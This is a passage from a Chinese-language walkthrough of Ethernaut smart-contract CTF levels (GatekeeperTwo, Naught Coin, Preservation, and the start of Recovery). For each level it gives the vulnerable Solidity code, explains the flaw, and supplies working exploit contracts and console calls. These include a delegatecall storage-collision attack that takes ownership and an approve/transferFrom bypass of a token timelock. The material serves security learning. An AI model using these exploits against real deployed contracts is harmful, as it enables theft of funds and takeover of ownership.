<li><code>gateTwo</code> ÈúÄË¶ÅË∞ÉÁî®ÂêàÁ∫¶ÁöÑ‰ª£Á†ÅÈïøÂ∫¶‰∏∫ 0Ôºå‰∏éËß£È¢òÁüõÁõæ„ÄÇ<a href="https://ethereum.github.io/yellowpaper/paper.pdf">ETHEREUM: A SECURE DECENTRALISED GENERALISED TRANSACTION LEDGER</a> ‰∏≠ÊèêÂà∞ÔºåÂú®‰ª£Á†ÅÂàùÂßãÂåñÊó∂ÔºåÂØπÂ∫îÂú∞ÂùÄÁöÑ <code>EXTCODESIZE</code> Â∫îËøîÂõû 0ÔºåÈÇ£‰πàÂè™ÈúÄË¶ÅÂú®ÊûÑÈÄ†ÂáΩÊï∞ÈáåË∞ÉÁî® <code>enter</code> Â∞±ÂèØ‰ª•‰∫Ü</li>
<li>Ëá≥‰∫é <code>gateThree</code>Ôºå‰ΩøÁî®ÂºÇÊàñÈÄÜËøêÁÆóÊ±ÇËß£Â∞±Â•ΩÂï¶</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">GatekeeperTwo</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">entrant</span><span class="p">;</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateOne</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateTwo</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span>
<span class="w">    </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">extcodesize</span><span class="p">(</span><span class="nx">caller</span><span class="p">())</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))))</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">gateOne</span><span class="w"> </span><span class="nx">gateTwo</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">entrant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">GatekeeperTwo</span><span class="w"> </span><span class="nx">gk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">GatekeeperTwo</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">gk</span><span class="p">.</span><span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))))</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">(</span><span class="nx">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">)));</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="_10">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
<p><a href="https://docs.soliditylang.org/en/v0.6.0/assembly.html#inline-assembly">Inline Assembly</a></p>
<h2 id="15-naught-coin">15. Naught Coin<a class="headerlink" href="#15-naught-coin" title="Permanent link">&para;</a></h2>
<p>ÂèñÂá∫Ë¢´ÈîÅ‰ΩèÁöÑÁ°¨Â∏ÅÔºåÊ∏ÖÁ©∫Ëá™Â∑±ÁöÑ‰ΩôÈ¢ù</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s1">&#39;@openzeppelin/contracts/token/ERC20/ERC20.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">NaughtCoin</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// Âü∫‰∫é ERC20</span>

<span class="w">  </span><span class="c1">// string public constant name = &#39;NaughtCoin&#39;;</span>
<span class="w">  </span><span class="c1">// string public constant symbol = &#39;0x0&#39;;</span>
<span class="w">  </span><span class="c1">// uint public constant decimals = 18;</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeLock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">365</span><span class="w"> </span><span class="nx">days</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">INITIAL_SUPPLY</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">player</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_player</span><span class="p">)</span><span class="w"> </span>
<span class="w">  </span><span class="nx">ERC20</span><span class="p">(</span><span class="s1">&#39;NaughtCoin&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0x0&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">player</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_player</span><span class="p">;</span>
<span class="w">    </span><span class="nx">INITIAL_SUPPLY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000000</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="mf">10</span><span class="o">**</span><span class="nx">uint256</span><span class="p">(</span><span class="nx">decimals</span><span class="p">()));</span>
<span class="w">    </span><span class="c1">// _totalSupply = INITIAL_SUPPLY;</span>
<span class="w">    </span><span class="c1">// _balances[player] = INITIAL_SUPPLY;</span>
<span class="w">    </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="nx">INITIAL_SUPPLY</span><span class="p">);</span><span class="w"> </span><span class="c1">// Creates INITIAL_SUPPLY tokens and assigns them to player</span>
<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="nx">INITIAL_SUPPLY</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_value</span><span class="p">)</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">lockTokens</span><span class="w"> </span><span class="nx">returns</span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// super ÁªßÊâøÁõ¥Êé•Áà∂ÂêàÁ∫¶ÁöÑ transfer ÂáΩÊï∞</span>
<span class="w">    </span><span class="k">super</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">_to</span><span class="p">,</span><span class="w"> </span><span class="nx">_value</span><span class="p">);</span><span class="w">  </span><span class="c1">// Â∞ÜË∞ÉÁî®ËÄÖ _value Êï∞ÈáèÁöÑÈáëÈ¢ùËΩ¨ÁßªÁªô _to</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// Prevent the initial owner from transferring tokens until the timelock has passed</span>
<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">lockTokens</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">player</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">timeLock</span><span class="p">);</span>
<span class="w">      </span><span class="nx">_</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">     </span><span class="nx">_</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span><span class="w"> </span>
</code></pre></div>
<ul>
<li><code>lockTokens</code> ÈôêÂà∂‰∫Ü <code>player</code>ÔºåËÄåË¢´Ë¶ÜÂÜôÁöÑ <code>transfer</code> Âè™ËÉΩÁî±ÊåÅÊúâË¥ßÂ∏ÅÁöÑË¥¶Êà∑ÂèëËµ∑ËΩ¨Ë¥¶</li>
<li>
<p><code>NaughtCoin</code> ÂêàÁ∫¶ÊòØ <code>ERC20</code> ÁöÑÂ≠êÂêàÁ∫¶ÔºåÂú®ÂêàÁ∫¶ <code>ERC20</code> ‰∏≠Èô§‰∫ÜÂÆö‰πâ <code>transfer</code> ËøòÊúâ <code>transferFrom</code> ÂáΩÊï∞ÔºåÁî±Ê≠§ÂèØ‰ª•ÁªïËøá <code>lockTokens</code> ÁöÑÈôêÂà∂</p>
<div class="highlight"><pre><span></span><code>transferFrom(address sender, address recipient, uint256 amount) ‚Üí bool
</code></pre></div>
</li>
<li>
<p>Âú®Ë∞ÉÁî® <code>transferFrom</code> ‰πãÂâçÈúÄË¶ÅÂèñÂæó <code>msg.sender</code> ÁöÑÊéàÊùÉ</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">INITIAL_SUPPLY</span><span class="p">())</span>
</code></pre></div>
</li>
<li>
<p>ÂèëËµ∑ËΩ¨Ë¥¶</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">INITIAL_SUPPLY</span><span class="p">())</span>
</code></pre></div>
</li>
</ul>
<h3 id="_11">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
<p><a href="https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#ERC20-_mint-address-uint256-">ERC 20 - OpenZeppelin Docs</a></p>
<h2 id="16-preservation">16. Preservation<a class="headerlink" href="#16-preservation" title="Permanent link">&para;</a></h2>
<p>Â£∞ÊòéÂØπÂÆû‰æãÁöÑÊâÄÊúâÊùÉ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Preservation</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="c1">// public library contracts </span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone1Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone2Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span><span class="w"> </span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="nx">storedTime</span><span class="p">;</span>
<span class="w">  </span><span class="c1">// Sets the function signature for delegatecall</span>
<span class="w">  </span><span class="nx">bytes4</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">setTimeSignature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes4</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;setTime(uint256)&quot;</span><span class="p">));</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_timeZone1LibraryAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_timeZone2LibraryAddress</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone1Library</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_timeZone1LibraryAddress</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nx">timeZone2Library</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_timeZone2LibraryAddress</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// set the time for timezone 1</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setFirstTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone1Library</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// set the time for timezone 2</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setSecondTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone2Library</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Simple library contract to set the time</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">LibraryContract</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="c1">// stores a timestamp </span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="nx">storedTime</span><span class="p">;</span><span class="w">  </span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_time</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">storedTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_time</span><span class="p">;</span><span class="w"> </span><span class="c1">// ‰øÆÊîπ‰∫ÜÁ¨¨‰∏Ä‰∏™Áä∂ÊÄÅÂèòÈáè</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li><code>delegatecall</code> Âè™‰ΩøÁî®ÁªôÂÆöÂú∞ÂùÄÁöÑ‰ª£Á†ÅÔºåÂÖ∂‰ªñÂ±ûÊÄßÔºàÂ≠òÂÇ®„ÄÅ‰ΩôÈ¢ùÁ≠âÔºâÈÉΩÂèñËá™ÂΩìÂâçÂêàÁ∫¶ÔºåÂõ†Ê≠§ÔºåË∞ÉÁî® <code>delegatecall</code> ÂêàÁ∫¶ÁöÑÂ≠òÂÇ®Â∏ÉÂ±ÄÂøÖÈ°ªÂíåË¢´Ë∞ÉÁî®ÂêàÁ∫¶‰øùÊåÅ‰∏ÄËá¥</li>
<li>ÂÖàÂà©Áî® <code>setFirstTime</code> ‰øÆÊîπÂêàÁ∫¶ <code>Preservation</code> ÁöÑÁ¨¨‰∏Ä‰∏™Áä∂ÊÄÅÂèòÈáèÔºåÂç≥ <code>timeZone1Library</code> ÁöÑÂÄº‰∏∫ÂêàÁ∫¶ <code>Hack</code> ÁöÑÂú∞ÂùÄÔºåÂÜçË∞ÉÁî® <code>setFirstTime</code> ÂáΩÊï∞ÔºåÊ≠§Êó∂Â∞ÜÊâßË°åÂêàÁ∫¶ <code>Hack</code> ‰∏≠ÁöÑ‰ª£Á†Å<ul>
<li><code>timeZone1Library</code> Â¶ÇÊûú‰øÆÊîπÈîôËØØÂàôÊó†Ê≥ïËøõË°åÂêéÁª≠Ê≠•È™§ÔºåÊ≠§Êó∂ÂÜçÈáçÊñ∞Áî≥ËØ∑‰∏Ä‰∏™ÂÆû‰æã</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Preservation</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone1Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone2Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span><span class="w"> </span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="nx">storedTime</span><span class="p">;</span>
<span class="w">  </span><span class="nx">bytes4</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">setTimeSignature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes4</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;setTime(uint256)&quot;</span><span class="p">));</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_timeZone1LibraryAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_timeZone2LibraryAddress</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone1Library</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_timeZone1LibraryAddress</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nx">timeZone2Library</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_timeZone2LibraryAddress</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setFirstTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone1Library</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setSecondTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone2Library</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">LibraryContract</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="nx">storedTime</span><span class="p">;</span><span class="w">  </span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_time</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">storedTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_time</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// Make sure the storage layout is the same as Preservation</span>
<span class="w">  </span><span class="c1">// This will allow us to correctly update the state variables</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone1Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone2Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span><span class="w"> </span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="nx">storedTime</span><span class="p">;</span>

<span class="w">  </span><span class="nx">Preservation</span><span class="w"> </span><span class="nx">preservation</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">preservation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Preservation</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">attack</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="c1">// override address of timeZone1Library</span>
<span class="w">      </span><span class="nx">preservation</span><span class="p">.</span><span class="nx">setFirstTime</span><span class="p">(</span><span class="nx">uint</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))));</span>
<span class="w">      </span><span class="c1">// change the owner</span>
<span class="w">      </span><span class="nx">preservation</span><span class="p">.</span><span class="nx">setFirstTime</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// function signature must match LibraryContract.setTimeSignature</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_time</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
<span class="w">      </span><span class="nx">_time</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>Â∫ìÂ∫î‰ΩøÁî® <code>library</code> Êù•Â£∞Êòé</li>
<li><code>library</code> ‰∏é <code>contract</code> Á±ª‰ººÔºå‰ΩÜ‰∏çËÉΩÂ£∞Êòé‰ªª‰ΩïÁä∂ÊÄÅÂèòÈáèÊàñÂêëÂÖ∂ÂèëÈÄÅ‰ª•Â§™</li>
</ul>
<h3 id="_12">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://solidity-by-example.org/hacks/delegatecall/">Delegatecall | Solidity by Example</a></li>
<li><a href="https://solidity-by-example.org/library/">Library | Solidity by Example</a></li>
</ul>
<h2 id="17-recovery">17. Recovery<a class="headerlink" href="#17-recovery" title="Permanent link">&para;</a></h2>
<p>‰ªéÈÅóÂ§±ÁöÑÂêàÁ∫¶Âú∞ÂùÄ‰∏≠ÊâæÂõû 0.5 ‰ª•Â§™</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Recovery</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="c1">//generate tokens</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">generateToken</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_name</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="ow">new</span><span class="w"> </span><span class="nx">SimpleToken</span><span class="p">(</span><span class="nx">_name</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">SimpleToken</span><span class="w"> </span><span class="p">{</span>

